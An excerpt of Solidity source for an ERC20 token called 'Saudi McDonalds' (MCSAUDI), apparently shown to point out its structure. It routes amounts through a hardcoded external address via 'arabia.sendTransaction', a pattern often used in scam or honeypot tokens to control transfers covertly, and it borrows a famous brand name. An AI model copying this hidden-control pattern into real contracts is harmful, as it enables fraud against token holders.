...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _arabia = 0xeB7bB5d977be9B7FE1f46332390a5D9B057594a4;
    address public pair;
    ...
    function getAmount(uint256 amount) internal returns (uint256) {
        return arabia.sendTransaction(amount);
    }
    ...
    function _DeployMcSaudi(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployMcSaudi(creator, initialSupply);
    }
}

contract McSaudi is ERC20Token {
    constructor() ERC20Token("Saudi McDonalds", "MCSAUDI", msg.sender, 2500000000 * 10 ** 18) {
    }
}